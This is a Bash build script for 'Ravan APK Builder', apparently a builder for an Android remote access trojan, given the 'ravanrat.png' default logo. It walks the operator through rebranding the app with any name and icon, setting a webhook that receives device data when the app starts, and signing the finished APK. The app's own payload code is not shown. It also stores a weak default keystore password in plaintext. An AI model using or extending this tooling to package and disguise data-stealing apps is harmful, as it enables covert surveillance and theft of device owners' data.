#!/bin/bash

#################################################
#          RAVAN APK BUILDER - Linux/Mac        #
#                   v2.0                        #
#                                               #
#  Developed by: Somesh              #
#  GitHub: github.com/someshsrichandan         #
#  LinkedIn: linkedin.com/in/someshsrichandan  #
#################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Script paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
CONFIG_FILE="$SCRIPT_DIR/build_config.txt"

# Default logo
DEFAULT_LOGO="$PROJECT_DIR/ravanrat.png"

# Banner
print_banner() {
    clear
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                                                              ║"
    echo "║     ██████╗  █████╗ ██╗   ██╗ █████╗ ███╗   ██╗              ║"
    echo "║     ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║              ║"
    echo "║     ██████╔╝███████║██║   ██║███████║██╔██╗ ██║              ║"
    echo "║     ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══██║██║╚██╗██║              ║"
    echo "║     ██║  ██║██║  ██║ ╚████╔╝ ██║  ██║██║ ╚████║              ║"
    echo "║     ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝              ║"
    echo "║                                                              ║"
    echo "║                    APK BUILDER v2.0                          ║"
    echo "║                                                              ║"
    echo "╠══════════════════════════════════════════════════════════════╣"
    echo "║  Developed by: Somesh                                        ║"
    echo "║  GitHub:   https://github.com/someshsrichandan               ║"
    echo "║  LinkedIn: https://linkedin.com/in/someshsrichandan          ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
}

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        PKG_MANAGER=""
        if command -v apt-get &> /dev/null; then
            PKG_MANAGER="apt"
        elif command -v yum &> /dev/null; then
            PKG_MANAGER="yum"
        elif command -v dnf &> /dev/null; then
            PKG_MANAGER="dnf"
        elif command -v pacman &> /dev/null; then
            PKG_MANAGER="pacman"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="mac"
        if command -v brew &> /dev/null; then
            PKG_MANAGER="brew"
        fi
    else
        OS="unknown"
    fi
}

# Auto-install Java
install_java() {
    echo -e "${CYAN}[*] Attempting to install Java automatically...${NC}"
    echo ""
    
    case $PKG_MANAGER in
        apt)
            echo -e "${YELLOW}[>] Running: sudo apt update && sudo apt install -y openjdk-11-jdk${NC}"
            sudo apt update && sudo apt install -y openjdk-11-jdk
            ;;
        yum)
            echo -e "${YELLOW}[>] Running: sudo yum install -y java-11-openjdk-devel${NC}"
            sudo yum install -y java-11-openjdk-devel
            ;;
        dnf)
            echo -e "${YELLOW}[>] Running: sudo dnf install -y java-11-openjdk-devel${NC}"
            sudo dnf install -y java-11-openjdk-devel
            ;;
        pacman)
            echo -e "${YELLOW}[>] Running: sudo pacman -S --noconfirm jdk11-openjdk${NC}"
            sudo pacman -S --noconfirm jdk11-openjdk
            ;;
        brew)
            echo -e "${YELLOW}[>] Running: brew install openjdk@11${NC}"
            brew install openjdk@11
            echo 'export PATH="/usr/local/opt/openjdk@11/bin:$PATH"' >> ~/.zshrc
            export PATH="/usr/local/opt/openjdk@11/bin:$PATH"
            ;;
        *)
            echo -e "${RED}[!] Cannot auto-install. Please install Java manually.${NC}"
            return 1
            ;;
    esac
    
    if command -v java &> /dev/null; then
        echo -e "${GREEN}[✓] Java installed successfully!${NC}"
        return 0
    else
        return 1
    fi
}

# Check requirements
check_requirements() {
    echo -e "${CYAN}[*] Checking requirements...${NC}"
    echo ""
    
    detect_os
    echo -e "${BLUE}    OS Detected: $OS${NC}"
    
    # Check Java
    if ! command -v java &> /dev/null; then
        echo -e "${RED}[!] Java is not installed.${NC}"
        echo ""
        echo -e "${PURPLE}[>] Options:${NC}"
        echo "    1. Auto-install Java (requires sudo)"
        echo "    2. Show manual installation instructions"
        echo "    3. Skip (I'll install later)"
        echo ""
        read -p "    Choose option [1]: " JAVA_OPTION
        JAVA_OPTION=${JAVA_OPTION:-1}
        
        case $JAVA_OPTION in
            1)
                install_java
                if [ $? -ne 0 ]; then
                    show_manual_java_install
                    exit 1
                fi
                ;;
            2)
                show_manual_java_install
                exit 1
                ;;
            3)
                echo -e "${YELLOW}[!] Skipping Java check. Build may fail.${NC}"
                ;;
        esac
    else
        JAVA_VERSION=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2)
        echo -e "${GREEN}[✓] Java found: $JAVA_VERSION${NC}"
    fi
    
    # Check keytool
    if command -v keytool &> /dev/null; then
        echo -e "${GREEN}[✓] keytool found${NC}"
    else
        echo -e "${YELLOW}[!] keytool not found. Usually comes with JDK.${NC}"
    fi
    
    # Check ImageMagick
    if command -v convert &> /dev/null; then
        echo -e "${GREEN}[✓] ImageMagick found (logo resizing enabled)${NC}"
        HAS_IMAGEMAGICK=true
    else
        echo -e "${YELLOW}[!] ImageMagick not found (optional - for logo resizing)${NC}"
        echo -e "${YELLOW}    Install: sudo apt install imagemagick (Linux) / brew install imagemagick (Mac)${NC}"
        HAS_IMAGEMAGICK=false
    fi
    
    echo ""
}

# Show manual Java installation instructions
show_manual_java_install() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              MANUAL JAVA INSTALLATION GUIDE                  ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}Ubuntu/Debian:${NC}"
    echo "    sudo apt update"
    echo "    sudo apt install openjdk-11-jdk"
    echo ""
    echo -e "${WHITE}Fedora/RHEL:${NC}"
    echo "    sudo dnf install java-11-openjdk-devel"
    echo ""
    echo -e "${WHITE}Arch Linux:${NC}"
    echo "    sudo pacman -S jdk11-openjdk"
    echo ""
    echo -e "${WHITE}macOS (Homebrew):${NC}"
    echo "    brew install openjdk@11"
    echo "    echo 'export PATH=\"/usr/local/opt/openjdk@11/bin:\$PATH\"' >> ~/.zshrc"
    echo ""
    echo -e "${WHITE}Manual Download:${NC}"
    echo "    https://adoptium.net/temurin/releases/"
    echo ""
    echo -e "${YELLOW}After installing, run this script again.${NC}"
    echo ""
}

# Generate keystore
generate_keystore() {
    echo -e "${CYAN}[*] Keystore Configuration${NC}"
    echo ""
    
    KEYSTORE_PATH="$PROJECT_DIR/ravan-keystore.jks"
    
    if [ -f "$KEYSTORE_PATH" ]; then
        echo -e "${YELLOW}[!] Keystore already exists at: $KEYSTORE_PATH${NC}"
        read -p "    Generate new keystore? (y/N): " REGENERATE
        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[✓] Using existing keystore${NC}"
            
            # Load existing config
            if [ -f "$CONFIG_FILE" ]; then
                source "$CONFIG_FILE"
            fi
            return
        fi
        rm -f "$KEYSTORE_PATH"
    fi
    
    echo -e "${PURPLE}[>] Enter keystore details:${NC}"
    echo ""
    
    read -p "    Key alias [ravan-key]: " KEY_ALIAS
    KEY_ALIAS=${KEY_ALIAS:-ravan-key}
    
    read -sp "    Keystore password (min 6 chars) [ravan123]: " KEYSTORE_PASS
    echo ""
    KEYSTORE_PASS=${KEYSTORE_PASS:-ravan123}
    
    read -p "    Your name [Ravan Developer]: " CN_NAME
    CN_NAME=${CN_NAME:-Ravan Developer}
    
    read -p "    Organization [Ravan Security]: " ORG_NAME
    ORG_NAME=${ORG_NAME:-Ravan Security}
    
    read -p "    Country code [US]: " COUNTRY
    COUNTRY=${COUNTRY:-US}
    
    read -p "    Validity in years [25]: " VALIDITY_YEARS
    VALIDITY_YEARS=${VALIDITY_YEARS:-25}
    VALIDITY_DAYS=$((VALIDITY_YEARS * 365))
    
    echo ""
    echo -e "${CYAN}[*] Generating keystore...${NC}"
    
    keytool -genkeypair \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 2048 \
        -validity $VALIDITY_DAYS \
        -keystore "$KEYSTORE_PATH" \
        -storepass "$KEYSTORE_PASS" \
        -keypass "$KEYSTORE_PASS" \
        -dname "CN=$CN_NAME, O=$ORG_NAME, C=$COUNTRY" \
        2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Keystore generated successfully!${NC}"
        echo ""
        
        # Create keystore.properties for Gradle
        KEYSTORE_PROPS="$PROJECT_DIR/keystore.properties"
        cat > "$KEYSTORE_PROPS" << EOF
storeFile=ravan-keystore.jks
storePassword=$KEYSTORE_PASS
keyAlias=$KEY_ALIAS
keyPassword=$KEYSTORE_PASS
EOF
        echo -e "${GREEN}[✓] Created keystore.properties for Gradle${NC}"
        
        # Save to config
        echo "KEYSTORE_PATH=$KEYSTORE_PATH" > "$CONFIG_FILE"
        echo "KEY_ALIAS=$KEY_ALIAS" >> "$CONFIG_FILE"
        echo "KEYSTORE_PASS=$KEYSTORE_PASS" >> "$CONFIG_FILE"
        
        # Show certificate info
        echo -e "${CYAN}[*] Certificate SHA-256 fingerprint:${NC}"
        keytool -list -v -keystore "$KEYSTORE_PATH" -storepass "$KEYSTORE_PASS" -alias "$KEY_ALIAS" 2>/dev/null | grep "SHA256:"
        echo ""
    else
        echo -e "${RED}[!] Failed to generate keystore${NC}"
        exit 1
    fi
}

# Configure logo
configure_logo() {
    echo -e "${CYAN}[*] Logo Configuration${NC}"
    echo ""
    
    RES_DIR="$PROJECT_DIR/app/src/main/res"
    
    echo -e "${PURPLE}[>] Logo options:${NC}"
    echo "    1. Use default Ravan logo (ravanrat.png)"
    echo "    2. Use custom logo (provide image path)"
    echo "    3. Keep current logo (no change)"
    echo ""
    read -p "    Choose option [1]: " LOGO_OPTION
    LOGO_OPTION=${LOGO_OPTION:-1}
    
    LOGO_PATH=""
    
    case $LOGO_OPTION in
        1)
            if [ -f "$DEFAULT_LOGO" ]; then
                LOGO_PATH="$DEFAULT_LOGO"
                echo -e "${GREEN}[✓] Using default Ravan logo${NC}"
            else
                echo -e "${RED}[!] Default logo not found at: $DEFAULT_LOGO${NC}"
                return
            fi
            ;;
        2)
            read -p "    Enter path to logo image (PNG, 512x512): " CUSTOM_LOGO
            if [ -f "$CUSTOM_LOGO" ]; then
                LOGO_PATH="$CUSTOM_LOGO"
            else
                echo -e "${RED}[!] Logo file not found: $CUSTOM_LOGO${NC}"
                return
            fi
            ;;
        3)
            echo -e "${GREEN}[✓] Keeping current logo${NC}"
            return
            ;;
    esac
    
    if [ -n "$LOGO_PATH" ]; then
        echo -e "${CYAN}[*] Processing logo...${NC}"
        
        # Copy to different sizes
        if [ "$HAS_IMAGEMAGICK" = true ]; then
            # Resize for different densities
            convert "$LOGO_PATH" -resize 48x48 "$RES_DIR/mipmap-mdpi/ic_launcher.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 72x72 "$RES_DIR/mipmap-hdpi/ic_launcher.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 96x96 "$RES_DIR/mipmap-xhdpi/ic_launcher.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 144x144 "$RES_DIR/mipmap-xxhdpi/ic_launcher.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 192x192 "$RES_DIR/mipmap-xxxhdpi/ic_launcher.png" 2>/dev/null
            
            # Round icons (keep same, Android handles rounding)
            convert "$LOGO_PATH" -resize 48x48 "$RES_DIR/mipmap-mdpi/ic_launcher_round.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 72x72 "$RES_DIR/mipmap-hdpi/ic_launcher_round.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 96x96 "$RES_DIR/mipmap-xhdpi/ic_launcher_round.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 144x144 "$RES_DIR/mipmap-xxhdpi/ic_launcher_round.png" 2>/dev/null
            convert "$LOGO_PATH" -resize 192x192 "$RES_DIR/mipmap-xxxhdpi/ic_launcher_round.png" 2>/dev/null
            
            echo -e "${GREEN}[✓] Logo resized and copied to all densities${NC}"
        else
            # Just copy to all folders without resize
            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher.png" 2>/dev/null
                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher_round.png" 2>/dev/null
            done
            echo -e "${GREEN}[✓] Logo copied (Install ImageMagick for auto-resize)${NC}"
        fi
        
        # Ask about transparent icon
        echo ""
        read -p "    Make icon background transparent? (y/N): " TRANSPARENT
        if [[ "$TRANSPARENT" =~ ^[Yy]$ ]] && [ "$HAS_IMAGEMAGICK" = true ]; then
            echo -e "${CYAN}[*] Making background transparent...${NC}"
            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
                convert "$RES_DIR/$density/ic_launcher.png" -transparent white "$RES_DIR/$density/ic_launcher.png" 2>/dev/null
                convert "$RES_DIR/$density/ic_launcher_round.png" -transparent white "$RES_DIR/$density/ic_launcher_round.png" 2>/dev/null
            done
            echo -e "${GREEN}[✓] Background made transparent${NC}"
        fi
    fi
    echo ""
}

# Configure app settings
configure_app() {
    echo -e "${CYAN}[*] App Configuration${NC}"
    echo ""
    
    STRINGS_FILE="$PROJECT_DIR/app/src/main/res/values/strings.xml"
    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
    
    # App name
    read -p "    Enter app name [Ravan Security]: " APP_NAME
    APP_NAME=${APP_NAME:-Ravan Security}
    
    # Update strings.xml
    if [ -f "$STRINGS_FILE" ]; then
        # Escape special characters for sed
        ESCAPED_NAME=$(echo "$APP_NAME" | sed 's/[&/\]/\\&/g')
        sed -i.bak "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$ESCAPED_NAME</string>|g" "$STRINGS_FILE"
        rm -f "${STRINGS_FILE}.bak"
        echo -e "${GREEN}[✓] App name set to: $APP_NAME${NC}"
    fi
    
    # Save app name to config
    echo "APP_NAME=$APP_NAME" >> "$CONFIG_FILE"
    
    # Google Sheet URL
    echo ""
    echo -e "${PURPLE}[>] Google Sheet Webhook Configuration${NC}"
    echo -e "${YELLOW}    This URL will receive device data when app starts.${NC}"
    echo -e "${YELLOW}    You need to set up Google Sheet manually (see README).${NC}"
    echo -e "${YELLOW}    Leave empty to skip.${NC}"
    echo ""
    read -p "    Enter Google Sheet webhook URL: " SHEET_URL
    
    if [ -n "$SHEET_URL" ]; then
        echo "SHEET_URL=$SHEET_URL" >> "$CONFIG_FILE"
        echo -e "${GREEN}[✓] Google Sheet URL saved to config${NC}"
    else
        echo -e "${YELLOW}[!] Skipping Google Sheet configuration${NC}"
    fi
    
    # Version configuration
    echo ""
    read -p "    Enter version name [2.0]: " VERSION_NAME
    VERSION_NAME=${VERSION_NAME:-2.0}
    
    read -p "    Enter version code [20]: " VERSION_CODE
    VERSION_CODE=${VERSION_CODE:-20}
    
    if [ -f "$BUILD_GRADLE" ]; then
        sed -i.bak "s|versionCode [0-9]*|versionCode $VERSION_CODE|g" "$BUILD_GRADLE"
        sed -i.bak "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
        rm -f "${BUILD_GRADLE}.bak"
        echo -e "${GREEN}[✓] Version set to: $VERSION_NAME (code: $VERSION_CODE)${NC}"
        
        echo "VERSION_NAME=$VERSION_NAME" >> "$CONFIG_FILE"
        echo "VERSION_CODE=$VERSION_CODE" >> "$CONFIG_FILE"
    fi
    
    echo ""
}

# Build APK
build_apk() {
    echo -e "${CYAN}[*] Building APK...${NC}"
    echo ""
    
    cd "$PROJECT_DIR"
    
    # Make gradlew executable
    chmod +x gradlew
    
    # Load config
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    fi
    
    echo -e "${CYAN}[*] Running Gradle build...${NC}"
    echo ""
    
    # Build release APK
    ./gradlew assembleRelease --no-daemon 2>&1 | while read line; do
        if [[ $line == *"BUILD SUCCESSFUL"* ]]; then
            echo -e "${GREEN}$line${NC}"
        elif [[ $line == *"BUILD FAILED"* ]] || [[ $line == *"FAILURE"* ]]; then
            echo -e "${RED}$line${NC}"
        elif [[ $line == *"> Task"* ]]; then
            echo -e "${BLUE}$line${NC}"
        else
            echo "$line"
        fi
    done
    
    # Check if build was successful
    APK_PATH="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
    UNSIGNED_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release-unsigned.apk"
    
    if [ -f "$APK_PATH" ] || [ -f "$UNSIGNED_APK" ]; then
        FINAL_APK="$APK_PATH"
        if [ -f "$UNSIGNED_APK" ] && [ ! -f "$APK_PATH" ]; then
            # Sign manually
            echo -e "${YELLOW}[*] Signing APK...${NC}"
            SIGNED_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release-signed.apk"
            
            jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
                -keystore "$KEYSTORE_PATH" \
                -storepass "$KEYSTORE_PASS" \
                -keypass "$KEYSTORE_PASS" \
                -signedjar "$SIGNED_APK" \
                "$UNSIGNED_APK" \
                "$KEY_ALIAS" 2>/dev/null
            
            FINAL_APK="$SIGNED_APK"
        fi
        
        # Copy to output folder
        OUTPUT_DIR="$SCRIPT_DIR/output"
        mkdir -p "$OUTPUT_DIR"
        
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)
        APP_NAME_SAFE=$(echo "${APP_NAME:-Ravan}" | tr ' ' '_')
        OUTPUT_APK="$OUTPUT_DIR/${APP_NAME_SAFE}-v${VERSION_NAME:-2.0}-${TIMESTAMP}.apk"
        cp "$FINAL_APK" "$OUTPUT_APK"
        
        echo ""
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                    BUILD SUCCESSFUL!                         ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}[✓] APK saved to: $OUTPUT_APK${NC}"
        echo ""
        
        # Get APK size
        APK_SIZE=$(du -h "$OUTPUT_APK" | cut -f1)
        echo -e "${CYAN}    APK Size: $APK_SIZE${NC}"
        echo ""
        
        echo -e "${PURPLE}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║  Developed by: Somesh                             ║${NC}"
        echo -e "${PURPLE}║  GitHub:   https://github.com/someshsrichandan              ║${NC}"
        echo -e "${PURPLE}║  LinkedIn: https://linkedin.com/in/someshsrichandan         ║${NC}"
        echo -e "${PURPLE}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
    else
        echo ""
        echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║                      BUILD FAILED!                           ║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${RED}[!] Check the error messages above${NC}"
        echo -e "${YELLOW}[!] Common fixes:${NC}"
        echo "    - Ensure Java 11+ is installed"
        echo "    - Check internet connection"
        echo "    - Run: ./gradlew --stop && ./gradlew clean"
        exit 1
    fi
}

# Main menu
main_menu() {
    print_banner
    
    echo -e "${PURPLE}[>] Build Options:${NC}"
    echo ""
    echo "    1. Full Build (Configure everything + Build)"
    echo "    2. Quick Build (Use existing config)"
    echo "    3. Generate Keystore Only"
    echo "    4. Configure Logo Only"
    echo "    5. Configure App Settings Only"
    echo "    6. Check/Install Requirements"
    echo "    7. Exit"
    echo ""
    read -p "    Choose option [1]: " MENU_OPTION
    MENU_OPTION=${MENU_OPTION:-1}
    
    echo ""
    
    case $MENU_OPTION in
        1)
            check_requirements
            generate_keystore
            configure_logo
            configure_app
            build_apk
            ;;
        2)
            check_requirements
            build_apk
            ;;
        3)
            check_requirements
            generate_keystore
            ;;
        4)
            detect_os
            HAS_IMAGEMAGICK=false
            if command -v convert &> /dev/null; then
                HAS_IMAGEMAGICK=true
            fi
            configure_logo
            ;;
        5)
            configure_app
            ;;
        6)
            check_requirements
            ;;
        7)
            echo -e "${CYAN}[*] Goodbye!${NC}"
            echo -e "${PURPLE}    Follow: https://github.com/someshsrichandan${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            exit 1
            ;;
    esac
}

# Run
main_menu
